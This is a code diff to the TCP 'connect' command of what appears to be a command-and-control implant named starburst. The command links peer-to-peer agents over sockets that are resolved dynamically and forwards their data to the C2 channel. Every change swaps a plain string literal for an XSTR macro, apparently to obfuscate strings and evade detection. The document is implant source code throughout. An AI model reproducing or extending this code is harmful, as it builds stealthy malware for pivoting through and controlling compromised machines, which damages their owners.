@@ -24,13 +24,13 @@ auto declfn starburst::cmd_connect(
 
     if ( !hostname || host_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "missing hostname" ) ) );
+            XSTR( "missing hostname" ) );
         return;
     }
 
     if ( port == 0 || port > 65535 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "invalid port" ) ) );
+            XSTR( "invalid port" ) );
         return;
     }
 
@@ -39,7 +39,7 @@ auto declfn starburst::cmd_connect(
         ts = static_cast<TcpLinkState*>( inst.heap_alloc( sizeof( TcpLinkState ) ) );
         if ( !ts ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+                XSTR( "alloc failed" ) );
             return;
         }
         memory::zero( ts, sizeof( TcpLinkState ) );
@@ -48,7 +48,7 @@ auto declfn starburst::cmd_connect(
 
     if ( !tcp_resolve_ws2( inst, ts ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to resolve ws2_32" ) ) );
+            XSTR( "failed to resolve ws2_32" ) );
         return;
     }
 
@@ -62,7 +62,7 @@ auto declfn starburst::cmd_connect(
     uintptr_t sock = ts->ws.psocket( TCP_AF_INET, TCP_SOCK_STREAM, TCP_IPPROTO_TCP );
     if ( sock == TCP_INVALID_SOCKET ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "socket creation failed" ) ) );
+            XSTR( "socket creation failed" ) );
         return;
     }
 
@@ -75,14 +75,14 @@ auto declfn starburst::cmd_connect(
     if ( addr.sin_addr == 0xFFFFFFFF ) {
         ts->ws.pclosesocket( sock );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "invalid address" ) ) );
+            XSTR( "invalid address" ) );
         return;
     }
 
     if ( ts->ws.pconnect( sock, &addr, sizeof( addr ) ) == TCP_SOCKET_ERROR ) {
         ts->ws.pclosesocket( sock );
         char err_buf[256] = {};
-        str_copy( err_buf, symbol<char*>( const_cast<char*>( "connect failed to " ) ) );
+        str_copy( err_buf, XSTR( "connect failed to " ) );
         str_concat( err_buf, host_buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR, err_buf );
         return;
@@ -96,7 +96,7 @@ auto declfn starburst::cmd_connect(
     if ( !link ) {
         ts->ws.pclosesocket( sock );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -127,7 +127,7 @@ auto declfn starburst::cmd_connect(
         if ( link->hostname ) inst.heap_free( link->hostname );
         inst.heap_free( link );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no response from P2P agent" ) ) );
+            XSTR( "no response from P2P agent" ) );
         return;
     }
 
@@ -152,7 +152,7 @@ auto declfn starburst::cmd_connect(
     if ( !pkg ) {
         inst.heap_free( p2p_data );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -160,7 +160,7 @@ auto declfn starburst::cmd_connect(
     package_add_byte( inst, pkg, C2_PROFILE_TCP );
     package_add_int32( inst, pkg, link->link_id );
     package_add_string( inst, pkg, link->agent_id ? link->agent_id :
-        symbol<char*>( const_cast<char*>( "" ) ) );
+        XSTR( "" ) );
     package_add_bytes( inst, pkg, p2p_data, p2p_len );
 
     inst.heap_free( p2p_data );
@@ -189,15 +189,15 @@ auto declfn starburst::cmd_connect(
     package_destroy( inst, pkg );
 
     char resp_buf[512] = {};
-    str_copy( resp_buf, symbol<char*>( const_cast<char*>( "Connected to " ) ) );
+    str_copy( resp_buf, XSTR( "Connected to " ) );
     str_concat( resp_buf, host_buf );
-    str_concat( resp_buf, symbol<char*>( const_cast<char*>( ":" ) ) );
+    str_concat( resp_buf, XSTR( ":" ) );
     char port_str[8] = {};
     int_to_str( port_str, port, 10 );
     str_concat( resp_buf, port_str );
-    str_concat( resp_buf, symbol<char*>( const_cast<char*>( "\nAgent: " ) ) );
+    str_concat( resp_buf, XSTR( "\nAgent: " ) );
     str_concat( resp_buf, link->agent_id ? link->agent_id :
-        symbol<char*>( const_cast<char*>( "unknown" ) ) );
+        XSTR( "unknown" ) );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, resp_buf );
 }
